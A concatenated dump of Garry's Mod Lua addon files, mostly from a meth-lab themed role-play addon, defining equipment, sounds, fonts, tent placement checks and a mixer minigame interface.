                ply:SH_AddStandardPoints( amount )
            end,
            formatFunction = function( amount )
                return string.Comma( amount ) .. " Points"
            end
        }

        BRICKS_SERVER.DEVCONFIG.Currencies["sh_premium_points"] = {
            Title = "SH Premium Points",
            getFunction = function( ply )
                return ply:SH_GetPremiumPoints()
            end,
            addFunction = function( ply, amount )
                ply:SH_AddPremiumPoints( amount )
            end,
            formatFunction = function( amount )
                return string.Comma( amount ) .. " Premium Points"
            end
        }
    end
end

if( gmod.GetGamemode() ) then
    loadCurrencies()
else
    hook.Add( "OnGamemodeLoaded", "BRS.OnGamemodeLoaded.DevConfig", loadCurrencies )
end
--PATH addons/zeros_methlab2/lua/zmlab2/sh_equipment_config.lua:
zmlab2 = zmlab2 or {}
zmlab2.config = zmlab2.config or {}
zmlab2.config.Equipment = zmlab2.config.Equipment or {}

// Here are all the entities which can be bought / build
zmlab2.config.Equipment.List = {
	[1] = {
		name = zmlab2.language["ventilation_title"],
		desc = zmlab2.language["ventilation_desc"],
		class = "zmlab2_machine_ventilation",
		model = "models/zerochain/props_methlab/zmlab2_ventilation.mdl",
		price = 300,
		limit = 1,
	},
	[2] = {
		name = zmlab2.language["storage_title"],
		desc = zmlab2.language["storage_desc"],
		class = "zmlab2_storage",
		model = "models/zerochain/props_methlab/zmlab2_storage.mdl",
		price = 300,
		limit = 1,
	},
	[3] = {
		name = zmlab2.language["furnace_title"],
		desc = zmlab2.language["furnace_desc"],
		class = "zmlab2_machine_furnace",
		model = "models/zerochain/props_methlab/zmlab2_furnance.mdl",
		price = 300,
		limit = 1,
	},
	[4] = {
		name = zmlab2.language["mixer_title"],
		desc = zmlab2.language["mixer_desc"],
		class = "zmlab2_machine_mixer",
		model = "models/zerochain/props_methlab/zmlab2_mixer.mdl",
		price = 300,
		limit = 1,
	},
	[5] = {
		name = zmlab2.language["filter_title"],
		desc = zmlab2.language["filter_desc"],
		class = "zmlab2_machine_filter",
		model = "models/zerochain/props_methlab/zmlab2_filter.mdl",
		price = 300,
		limit = 1,
	},
	[6] = {
		name = zmlab2.language["filler_title"],
		desc = zmlab2.language["filler_desc"],
		class = "zmlab2_machine_filler",
		model = "models/zerochain/props_methlab/zmlab2_filler.mdl",
		price = 300,
		limit = 1,
	},
	[7] = {
		name = zmlab2.language["frezzer_title"],
		desc = zmlab2.language["frezzer_desc"],
		class = "zmlab2_machine_frezzer",
		model = "models/zerochain/props_methlab/zmlab2_frezzer.mdl",
		price = 300,
		limit = 1,
	},
	[8] = {
		name = zmlab2.language["packingtable_title"],
		desc = zmlab2.language["packingtable_desc"],
		class = "zmlab2_table",
		model = "models/zerochain/props_methlab/zmlab2_table.mdl",
		price = 300,
		limit = 1,
	}
}

--PATH addons/zeros_methlab2/lua/zmlab2/util/sh_entitytracker.lua:
zmlab2 = zmlab2 or {}
zmlab2.EntityTracker = zmlab2.EntityTracker or {}
zmlab2.EntityTracker.List = zmlab2.EntityTracker.List or {}

function zmlab2.EntityTracker.Add(ent)
	table.insert(zmlab2.EntityTracker.List, ent)
end

function zmlab2.EntityTracker.Remove(ent)
	table.RemoveByValue(zmlab2.EntityTracker.List, ent)
end

function zmlab2.EntityTracker.GetList()
	return zmlab2.EntityTracker.List
end

--PATH addons/zeros_methlab2/lua/zmlab2/util/sh_sounds.lua:
zmlab2 = zmlab2 or {}

zmlab2.Sound = zmlab2.Sound or {}
zmlab2.Sound.List = zmlab2.Sound.List or {}

// This packs the requested sound Data
function zmlab2.Sound.Catch(id)
	local soundData = {}
	local soundTable = zmlab2.Sound.List[id]
	soundData.sound = soundTable.paths[math.random(#soundTable.paths)]
	soundData.lvl = soundTable.lvl
	soundData.pitch = math.Rand(soundTable.pitchMin, soundTable.pitchMax)
	soundData.volume = soundTable.volume or 1 //zmlab2.Convar.Get("zmlab2_cl_sfx_volume") or 1

	return soundData
end

function zmlab2.Sound.EmitFromPosition(pos,id)
	local soundData = zmlab2.Sound.Catch(id)
	sound.Play(soundData.sound, pos, soundData.lvl, soundData.pitch, soundData.volume)
end

function zmlab2.Sound.EmitFromEntity(id, ent)

	local cur_time = math.Round(CurTime(),2)

	// Lets make sure we dont play the same sound at the same time more then a specified amount 5
	if ent.SoundTracker and ent.SoundTracker[id] and ent.SoundTracker[id][cur_time] and ent.SoundTracker[id][cur_time] >= 5 then
		return
	else
		if ent.SoundTracker == nil then
			ent.SoundTracker = {}
		end

		if ent.SoundTracker[id] == nil then
			ent.SoundTracker[id] = {}
		end

		ent.SoundTracker[id][cur_time] = (ent.SoundTracker[id][cur_time] or 0) + 1
	end

	local soundData = zmlab2.Sound.Catch(id)
	ent:EmitSound(soundData.sound, soundData.lvl, soundData.pitch, soundData.volume, CHAN_STATIC, 0, 0)
end

function zmlab2.Sound.StopFromEntity(id, ent)
	local soundData = zmlab2.Sound.Catch(id)
	ent:StopSound(soundData.sound)
end

sound.Add({
	name = "zmlab2_npc_sell",
	channel = CHAN_STATIC,
	volume = 1,
	level = 70,
	pitch = {100, 100},
	sound = {"vo/npc/male01/question05.wav", "vo/npc/male01/question06.wav", "vo/npc/male01/question09.wav", "vo/npc/male01/question10.wav", "vo/npc/male01/question13.wav", "vo/npc/male01/question18.wav", "vo/npc/male01/question19.wav", "vo/npc/male01/question23.wav", "vo/npc/male01/question25.wav", "vo/npc/male01/question27.wav", "vo/npc/male01/question28.wav"}
})

sound.Add({
	name = "zmlab2_dropoff_door",
	channel = CHAN_STATIC,
	volume = 1,
	level = 70,
	pitch = {70, 90},
	sound = {"doors/door_metal_thin_close2.wav",
	"doors/door_metal_thin_move1.wav", "doors/door_metal_thin_open1.wav"}
})

sound.Add({
	name = "zmlab2_ui_click",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {"UI/buttonclick.wav"}
})

sound.Add({
	name = "zmlab2_sniff",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {95, 105},
	sound = {"zmlab2/sniff01.wav","zmlab2/sniff02.wav"}
})

sound.Add({
	name = "zmlab2_npc_wrongjob",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {"vo/npc/male01/pardonme01.wav", "vo/npc/male01/pardonme02.wav"}
})


sound.Add({
	name = "zmlab2_minigame_loop",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 75,
	pitch = {100, 100},
	sound = "zmlab2/minigame_loop.wav"
})

sound.Add({
	name = "zmlab2_errorgame_loop",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 75,
	pitch = {100, 100},
	sound = "zmlab2/errorgame_loop.wav"
})

sound.Add( {
	name = "zmlab2_boil01_loop",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 75,
	pitch = {100, 100},
	sound = "zmlab2/boil01_loop.wav"
} )
sound.Add( {
	name = "zmlab2_boil02_loop",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 75,
	pitch = {100, 100},
	sound = "zmlab2/boil02_loop.wav"
} )

sound.Add( {
	name = "zmlab2_tent_construction_loop",
	channel = CHAN_STATIC,
	volume = 1.0,
	level = 75,
	pitch = {100, 100},
	sound = "zmlab2/tent_construction_loop.wav"
} )

sound.Add( {
	name = "zmlab2_machine_icebreaker_loop",
	channel = CHAN_STATIC,
	volume = 0.5,
	level = 75,
	pitch = {100, 100},
	sound = "ambient/machines/engine1.wav"
} )


sound.Add({
	name = "zmlab2_meth_consum",
	channel = CHAN_STATIC,
	volume = 0.5,
	level = 75,
	pitch = {100, 100},
	sound = {"zmlab2/meth_consum02.wav", "zmlab2/meth_consum02.wav", "zmlab2/meth_consum02.wav"}
})

sound.Add({
	name = "zmlab2_crate_place",
	channel = CHAN_STATIC,
	volume = 1,
	level = 75,
	pitch = {100, 100},
	sound = {"physics/plastic/plastic_barrel_impact_soft1.wav", "physics/plastic/plastic_barrel_impact_soft2.wav", "physics/plastic/plastic_barrel_impact_soft3.wav"}
})


// Add all the meth musics
for k, v in pairs(zmlab2.config.MethTypes) do
	if v.visuals.music then
		sound.Add({
			name = "zmlab2_meth_music_" .. k,
			channel = CHAN_STATIC,
			volume = 1,
			level = 75,
			pitch = {100, 100},
			sound = v.visuals.music
		})
	end
end



zmlab2.Sound.List["minigame_fail"] = {
	paths = {
		"physics/metal/metal_box_impact_bullet1.wav",
		"physics/metal/metal_box_impact_bullet2.wav",
		"physics/metal/metal_box_impact_bullet3.wav",
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["machine_explode"] = {
	paths = {
		"weapons/explode3.wav",
		"weapons/explode4.wav",
		"weapons/explode5.wav",
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["meth_breaking"] = {
	paths = {
		"zmlab2/meth_breaking01.mp3",
		"zmlab2/meth_breaking02.mp3",
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["progress_fillingcrate"] = {
	paths = {
		"zmlab2/process_fillingcrate.wav",
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["lox_explo"] = {
	paths = {
		"zmlab2/lox_explo.wav",
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}



zmlab2.Sound.List["crate_place"] = {
	paths = {
		"physics/plastic/plastic_barrel_impact_soft4.wav",
		"physics/plastic/plastic_barrel_impact_soft5.wav",
		"physics/plastic/plastic_barrel_impact_soft6.wav"
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["gas_buff"] = {
	paths = {"zmlab2/gas_buff01.wav","zmlab2/gas_buff02.wav","zmlab2/gas_buff03.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["zapp"] = {
	paths = {
		"ambient/energy/spark1.wav",
		"ambient/energy/spark2.wav",
		"ambient/energy/spark3.wav",
		"ambient/energy/spark4.wav",
		"ambient/energy/spark5.wav",
		"ambient/energy/spark6.wav"
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}


zmlab2.Sound.List["Extinguish"] = {
	paths = {"player/sprayer.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}
zmlab2.Sound.List["cash"] = {
	paths = {"zmlab2/cash.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["liquid_fill"] = {
	paths = {"zmlab2/liquid_fill01.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100,
	volume = 0.5
}

zmlab2.Sound.List["crate_fill"] = {
	paths = {"zmlab2/methcrate_fill01.mp3","zmlab2/methcrate_fill02.mp3"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["lox_loaded"] = {
	paths = {"zmlab2/air_release01.wav","zmlab2/air_release02.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

sound.Add({
	name = "zmlab2_machine_compressing",
	channel = CHAN_STATIC,
	volume = 0.25,
	level = 60,
	pitch = {100, 100},
	sound = {"zmlab2/compressor_loop.wav"}
})



sound.Add({
	name = "progress_collecting",
	channel = CHAN_STATIC,
	volume = 1,
	level = 70,
	pitch = {50, 100},
	sound = {"physics/plastic/plastic_barrel_impact_soft1.wav",
	"physics/plastic/plastic_barrel_impact_soft2.wav", "physics/plastic/plastic_barrel_impact_soft3.wav", "physics/plastic/plastic_barrel_impact_soft4.wav", "physics/plastic/plastic_barrel_impact_soft5.wav"}
})

sound.Add({
	name = "zmlab2_machine_pumping",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {"ambient/machines/city_ventpump_loop1.wav"}
})

sound.Add({
	name = "zmlab2_gas_indicator",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {
		"player/geiger1.wav",
		"player/geiger2.wav",
		"player/geiger3.wav"
	}
})




sound.Add({
	name = "zmlab2_machine_venting",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {"zmlab2/fermenting.wav"}
})
sound.Add({
	name = "zmlab2_machine_mixing",
	channel = CHAN_STATIC,
	volume = 1,
	level = 55,
	pitch = {100, 100},
	sound = {"ambient/levels/labs/machine_moving_loop4.wav"}
})



sound.Add({
	name = "zmlab2_machine_ventilation",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {"zmlab2/ventilation_on_loop.wav"}
})

sound.Add({
	name = "zmlab2_ventilation_off",
	channel = CHAN_STATIC,
	volume = 1,
	level = 70,
	pitch = {100, 100},
	sound = {"zmlab2/ventilation_off.wav"}
})


// 949137607
sound.Add({
	name = "zmlab2_machine_condensing",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {"zmlab2/condensing.wav"}
})

sound.Add({
	name = "zmlab2_machine_cooling",
	channel = CHAN_STATIC,
	volume = 1,
	level = 60,
	pitch = {100, 100},
	sound = {"zmlab2/cooling.wav"}
})

/*
sound.Add({
	name = "zmlab2_vent_off",
	channel = CHAN_STATIC,
	volume = 1,
	level = 70,
	pitch = {100, 100},
	sound = {"zmlab2/vent_off.wav"}
})

sound.Add({
	name = "zmlab2_vent_on",
	channel = CHAN_STATIC,
	volume = 1,
	level = 70,
	pitch = {100, 100},
	sound = {"zmlab2/vent_on.wav"}
})
*/

zmlab2.Sound.List["frezzing_crack"] = {
	paths = {
		"zmlab2/meth_frezzing01.mp3",
		"zmlab2/meth_frezzing02.mp3",
		"zmlab2/meth_frezzing03.mp3",
		"zmlab2/meth_frezzing04.mp3",
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["cleaning_splash"] = {
	paths = {"ambient/water/water_splash1.wav","ambient/water/water_splash2.wav","ambient/water/water_splash3.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100,
	volume = 0.30
}

zmlab2.Sound.List["cleaning_shrub"] = {
	paths = {
		"zmlab2/clean01.wav",
		"zmlab2/clean02.wav",
		"zmlab2/clean03.wav",
		"zmlab2/clean04.wav",
		"zmlab2/clean05.wav",
		"zmlab2/clean06.wav",
		"zmlab2/clean07.wav",
		"zmlab2/clean08.wav",
		"zmlab2/clean09.wav",
		"zmlab2/clean10.wav",
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["aluminium_fill"] = {
	paths = {"zmlab2/aluminfill01.mp3","zmlab2/aluminfill02.mp3"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["acid_explo"] = {
	paths = {"zmlab2/acid_explo.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["aluminium_explo"] = {
	paths = {"zmlab2/aluminiumshake01.mp3","zmlab2/aluminiumshake02.mp3","zmlab2/aluminiumshake03.mp3","zmlab2/aluminiumshake04.mp3","zmlab2/aluminiumshake05.mp3"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["tent_unfold"] = {
	paths = {"zmlab2/tent_unfold.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["tent_construction_complete"] = {
	paths = {"zmlab2/tent_construction_complete.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["progress_done"] = {
	paths = {"buttons/combine_button_locked.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["progress_error"] = {
	paths = {"common/warning.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["task_completed"] = {
	paths = {"buttons/button3.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}


zmlab2.Sound.List["button_change"] = {
	paths = {"buttons/blip1.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["pumpsystem_start"] = {
	paths = {"buttons/lever8.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["pumpsystem_connected"] = {
	paths = {"buttons/lever7.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100
}

zmlab2.Sound.List["tray_addqueue"] = {
	paths = {"physics/metal/metal_solid_impact_soft3.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100,
	volume = 0.25,
}

zmlab2.Sound.List["tray_drop"] = {
	paths = {
	"physics/metal/metal_sheet_impact_hard2.wav",
	"physics/metal/metal_sheet_impact_hard6.wav",
	"physics/metal/metal_sheet_impact_hard7.wav"
	},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100,
	volume = 0.25,
}

zmlab2.Sound.List["tray_add"] = {
	paths = {"physics/metal/metal_sheet_impact_soft2.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100,
	volume = 0.25,
}

zmlab2.Sound.List["error"] = {
	paths = {"zmlab2/error.wav"},
	lvl = 75,
	pitchMin = 100,
	pitchMax = 100,
	volume = 1,
}

--PATH addons/zeros_methlab2/lua/zmlab2/util/cl_fonts.lua:
if SERVER then return end

zmlab2 = zmlab2 or {}
zmlab2.LoadedFonts = {}
zmlab2.FontData = {}

function zmlab2.GetFont(id)
	if zmlab2.LoadedFonts[id] then
		// Font already exists
		return id
	else

		// Create Font
		surface.CreateFont(id, zmlab2.FontData[id])
		zmlab2.LoadedFonts[id] = true

		zmlab2.Print("Font " .. id .. " cached!")
		return id
	end
end

////////////////////////////////////////////
///////////////// DEFAULT //////////////////
////////////////////////////////////////////
zmlab2.FontData["zmlab2_font00"] = {
	font = "Nexa Bold",
	extended = true,
	size = 20,
	weight = 100,
	antialias = true
}

zmlab2.FontData["zmlab2_font01"] = {
	font = "Nexa Bold",
	extended = true,
	size = 20,
	weight = 1,
	antialias = true
}

zmlab2.FontData["zmlab2_font02"] = {
	font = "Nexa Bold",
	extended = true,
	size = 50,
	weight = 1,
	antialias = true
}

zmlab2.FontData["zmlab2_font03"] = {
	font = "Nexa Bold",
	extended = true,
	size = 80,
	weight = 1,
	antialias = true
}

zmlab2.FontData["zmlab2_font04"] = {
	font = "Nexa Bold",
	extended = true,
	size = 40,
	weight = 1,
	antialias = true
}


zmlab2.FontData["zmlab2_font05"] = {
	font = "Nexa Bold",
	extended = true,
	size = 30,
	weight = 1,
	antialias = true
}


////////////////////////////////////////////
///////////////// VGUI /////////////////////
////////////////////////////////////////////
zmlab2.FontData["zmlab2_vgui_font00"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(25),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font01"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(15),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font02"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(5.9),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font03"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(10),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font05"] = {
	font = "Nexa Bold",
	extended = true,
	size = ScreenScale(4.6),
	weight = ScreenScale(100),
	antialias = true
}

zmlab2.FontData["zmlab2_vgui_font06"] = {
	font = "Nexa Light",
	extended = true,
	size = ScreenScale(6),
	weight = ScreenScale(100),
	antialias = true
}

--PATH addons/zeros_methlab2/lua/zmlab2/tent/sh_tent.lua:
zmlab2 = zmlab2 or {}
zmlab2.Tent = zmlab2.Tent or {}

zmlab2.Tent_LightColors = {
    [1] = Color(126, 181, 239),
    [2] = Color(211, 49, 49),
    [3] = Color(211, 49, 87),
    [4] = Color(211, 49, 209),
    [5] = Color(133, 49, 211),
    [6] = Color(49, 57, 211),
    [7] = Color(49, 91, 211),
    [8] = Color(49, 167, 211),
    [9] = Color(49, 211, 178),
    [10] = Color(49, 211, 87),
    [11] = Color(110, 211, 49),
    [12] = Color(197, 211, 49),
    [13] = Color(211, 144, 49),
    [14] = Color(211, 95, 49),
    [15] = color_white,
    [16] = Color(125, 125, 125),
    [17] = Color(0, 0, 0)
}

function zmlab2.Tent.Builder_Trace(start_pos,end_pos)

    //debugoverlay.Line( start_pos, end_pos, 0.1, Color( 255, 255,255 ), true )

    local c_trace = zmlab2.util.TraceLine({
        start = start_pos,
        endpos = end_pos,
        filter = {},
        //mask = MASK_SOLID_BRUSHONLY,
    }, "zmlab2.Tent.Builder_Trace")
    return c_trace.Hit
end

// Tells us if there is enough space for the current tent layout
function zmlab2.Tent.Builder_HasSpace(Tent)

    local TentData = zmlab2.config.Tent[Tent:GetTentID()]
    if TentData == nil then return false end

    //local min,max = Tent.PreviewModel:GetModelBounds()
    local min,max = TentData.min,TentData.max

    // Check if we got enough space
    local pos = Tent:GetPos() + Tent:GetUp() * (max.z / 4)
    local left = zmlab2.Tent.Builder_Trace(pos,pos + Tent:GetRight() * max.y)
    local right = zmlab2.Tent.Builder_Trace(pos,pos + Tent:GetRight() * min.y)
    local forward = zmlab2.Tent.Builder_Trace(pos,pos + Tent:GetForward() * max.x)
    local back = zmlab2.Tent.Builder_Trace(pos,pos + Tent:GetForward() * min.x)
    local up = zmlab2.Tent.Builder_Trace(pos,pos + Tent:GetUp() * max.z)

    if left or right or forward or back or up then
        return false
    else
        return true
    end
end

function zmlab2.Tent.Builder_IsAreaFree(Tent)

    local TentData = zmlab2.config.Tent[Tent:GetTentID()]
    if TentData == nil then return false end

    local min,max = TentData.min,TentData.max

    local rad = (min + max):Length() * 1.5

    // Check if the area is clear
    local AreaClear = true

    for k,v in pairs(ents.FindInSphere(Tent:GetPos(),rad)) do
        if not IsValid(v) then continue end
        //if v:GetClass() == "zmlab2_tent" then continue end
        if v:IsPlayer() == false then continue end
        AreaClear = false
        break
    end
    return AreaClear
end

// Returns a value from 0 to 1 depending on when the player can use the Extinguir again
function zmlab2.Tent.GetNextExtinguish(Tent)
    return math.Clamp((1 / zmlab2.config.Extinguisher.Interval) * (CurTime() - Tent:GetLastExtinguish()), 0, 1)
end

--PATH addons/zeros_methlab2/lua/zmlab2/equipment/cl_equipment_vgui.lua:
if not CLIENT then return end
zmlab2 = zmlab2 or {}
zmlab2.Equipment = zmlab2.Equipment or {}

net.Receive("zmlab2_Equipment_OpenInterface", function(len)
    zmlab2.Debug_Net("zmlab2_Equipment_OpenInterface",len)

    LocalPlayer().zmlab2_Equipment = net.ReadEntity()

    // If we currently removing / placing something then stop
    zmlab2.PointerSystem.Stop()

    zmlab2.Equipment.OpenInterface()
end)

function zmlab2.Equipment.OpenInterface()
    zmlab2.Interface.Create(600,365,zmlab2.language["Equipment"],function(pnl)
        function pnl:Think()
            if input.IsMouseDown(MOUSE_RIGHT) == true then
                LocalPlayer().zmlab2_Equipment = nil
                pnl:Close()
            end
        end

        zmlab2.Interface.AddModelList(pnl,zmlab2.config.Equipment.List,function(id)
            // IsLocked
            return false
        end,
        function(id)
            // IsSelected
            return false
        end,
        function(id)
            // OnClick
            zmlab2.Equipment.Place(LocalPlayer().zmlab2_Equipment,id)
            pnl:Close()
        end,
        function(raw_data)
            return {model = raw_data.model,render = {FOV = 35}} , raw_data.name , zmlab2.Money.Display(raw_data.price)
        end)
    end)
end

--PATH addons/zeros_methlab2/lua/zmlab2/mixer/cl_mixer_minigame.lua:
if not CLIENT then return end
local MiniGameVGUI = {}

net.Receive("zmlab2_Mixer_MiniGame", function(len)
    zmlab2.Debug_Net("zmlab2_Mixer_MiniGame", len)
    LocalPlayer().zmlab2_Mixer = net.ReadEntity()

    if IsValid(zmlab2_Mixer_MiniGame_panel) then
        zmlab2_Mixer_MiniGame_panel:Remove()
    end

    zmlab2_Mixer_MiniGame_panel = vgui.Create("zmlab2_vgui_Mixer_MiniGame")
end)

function MiniGameVGUI:Init()
    self:SetSize(600 * zmlab2.wM, 750 * zmlab2.hM)
    self:Center()
    self:MakePopup()
    self:ShowCloseButton(false)
    self:SetTitle("")
    self:SetDraggable(true)
    self:SetSizable(false)
    self:DockPadding(0, 0, 0, 0)

    // The allowed deviation from the center point
    self.ErrorMargin = 0.1

    // The default distance to the goal
    self.DistanceToGoal = 0.25

    if IsValid(LocalPlayer().zmlab2_Mixer) and LocalPlayer().zmlab2_Mixer:GetClass() == "zmlab2_machine_mixer" then
        local difficulty = zmlab2.Meth.GetDifficulty(LocalPlayer().zmlab2_Mixer:GetMethType())

        local DiffChange = (1 / 10) * (10 - difficulty)

        self.ErrorMargin = self.ErrorMargin + (0.2 * DiffChange)

        self.DistanceToGoal = self.DistanceToGoal - (0.25 * DiffChange)
    end

    self.StartTime = CurTime()
    self.PosX = 0
    self.PosY = 0
    self.IsFalling = false
    self.IsAnimating = false
    self.FallValue = 0
    self.PlayMusic = true
end

function MiniGameVGUI:Paint(w, h)
    surface.SetDrawColor(zmlab2.colors["blue02"])
    surface.SetMaterial(zmlab2.materials["item_bg"])
    surface.DrawTexturedRect(0 * zmlab2.wM, 0 * zmlab2.hM, w, h)
    local size = h * 1.2
    local newX = (w * 0.5) + (w * 0.4) * self.PosX

    if self.IsFalling or self.IsAnimating then
        self.PosY = (-size * self.DistanceToGoal) + ((size * (0.325 + self.DistanceToGoal)) * self.FallValue)
    else
        self.PosY = -size * self.DistanceToGoal
    end

    surface.SetDrawColor(color_white)
    surface.SetMaterial(zmlab2.materials["long_pipe"])
    surface.DrawTexturedRectRotated(newX, self.PosY, size, size, 0)

    if self.IsAnimating == false then
        surface.SetDrawColor(color_white)
        local rot = 15 * math.sin(CurTime() * 6)
        rot = zmlab2.util.SnapValue(15, rot)

        if rot == 15 then
            surface.SetMaterial(zmlab2.materials["pipe_smoke02"])
        elseif rot == 0 then
            surface.SetMaterial(zmlab2.materials["pipe_smoke01"])
        elseif rot == -15 then
            surface.SetMaterial(zmlab2.materials["pipe_smoke03"])
        end

        surface.DrawTexturedRectRotated(w / 2, h - 110 * zmlab2.hM, 220 * zmlab2.wM, 220 * zmlab2.hM, 0)
    end

    if self.IsAnimating == false and self.IsFalling == false then
        draw.SimpleText(zmlab2.language["SPACE"], zmlab2.GetFont("zmlab2_vgui_font01"), w / 2, h * 0.75, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

        local barSize = w * self.ErrorMargin
        if math.abs(self.PosX) < self.ErrorMargin then
            draw.RoundedBox(5, w / 2 - barSize / 2, h - 165 * zmlab2.hM, barSize, 10 * zmlab2.hM, color_white)
        else
            draw.RoundedBox(5, w / 2 - barSize / 2, h - 165 * zmlab2.hM, barSize, 10 * zmlab2.hM, zmlab2.colors["black03"])
        end
    else
        surface.SetDrawColor(color_white)
        surface.SetMaterial(zmlab2.materials["pipe_connect"])
        surface.DrawTexturedRectRotated(w / 2, h - 110 * zmlab2.hM, 220 * zmlab2.wM, 220 * zmlab2.hM, 0)
    end

    zmlab2.util.DrawOutlinedBox(0 * zmlab2.wM, 0 * zmlab2.hM, w, h, 2, color_white)
end

function MiniGameVGUI:ShowResult(WeWon)
    self.IsAnimating = true

    // Snap to center so it fits better
    if WeWon then
        self.PosX = 0
    end

    if WeWon then
        surface.PlaySound("zmlab2/minigame_won.wav")
    else
        surface.PlaySound("zmlab2/minigame_lost.wav")
    end

    local MainContainer = vgui.Create("DPanel", self)
    MainContainer:SetAlpha(0)
    MainContainer:Dock(FILL)

    MainContainer.Paint = function(s, w, h)
        draw.RoundedBox(0, 0, 0, w, h, zmlab2.colors["black03"])

        if WeWon then
            draw.SimpleText(zmlab2.language["Connected"], zmlab2.GetFont("zmlab2_vgui_font00"), w / 2, h / 2, zmlab2.colors["green03"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        else
            draw.SimpleText(zmlab2.language["Missed"], zmlab2.GetFont("zmlab2_vgui_font00"), w / 2, h / 2, zmlab2.colors["red02"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end
    end

    MainContainer:AlphaTo(255, 0.25, 0, function()
        timer.Simple(1, function()
            if not IsValid(self) then return end

            net.Start("zmlab2_Mixer_MiniGame")
            net.WriteEntity(LocalPlayer().zmlab2_Mixer)
            net.WriteBool(WeWon)
            net.SendToServer()

            self:Close()
        end)
    end)
end

function MiniGameVGUI:Think()

    if self.IsFalling == false and self.IsAnimating == false and input.IsKeyDown(KEY_ESCAPE) then
        self:Close()
    end


    if self.PlayMusic == true then
        if self.Sound == nil then
            self.Sound = CreateSound(LocalPlayer().zmlab2_Mixer, "zmlab2_minigame_loop")
        else
            if self.Sound:IsPlaying() == false then
                self.Sound:Play()
                self.Sound:ChangeVolume(1, 1)
            end
        end
    else
        if self.Sound and self.Sound:IsPlaying() == true then
            self.Sound:Stop()
        end
    end

    if self.IsAnimating == true then return end

    if self.IsFalling then
        local passed = CurTime() - self.StartTime
        self.FallValue = math.Clamp((1 / 0.5) * passed, 0, 1)
        self.FallValue = math.EaseInOut(self.FallValue, 1, 0)

        // If we reached the endpipe lets check if the value was correct
        if self.FallValue >= 1 then
            self.IsFalling = false

            if math.abs(self.PosX) < self.ErrorMargin then
                // We won!
                self:ShowResult(true)
            else
                // We missed!
                self:ShowResult(false)
            end
        end
    else
        self.PosX = math.sin(CurTime() * 2)
    end

    if self.IsAnimating == false and input.IsKeyDown(KEY_SPACE) then
        self.StartTime = CurTime()
        self.IsFalling = true
        surface.PlaySound("zmlab2/minigame_hit.wav")
        self.PlayMusic = false
    end
end

// Close the editor
function MiniGameVGUI:Close()

    self.PlayMusic = false
    if self.Sound and self.Sound:IsPlaying() == true then self.Sound:Stop() end
    LocalPlayer().zmlab2_Mixer = nil

    if IsValid(zmlab2_Mixer_MiniGame_panel) then
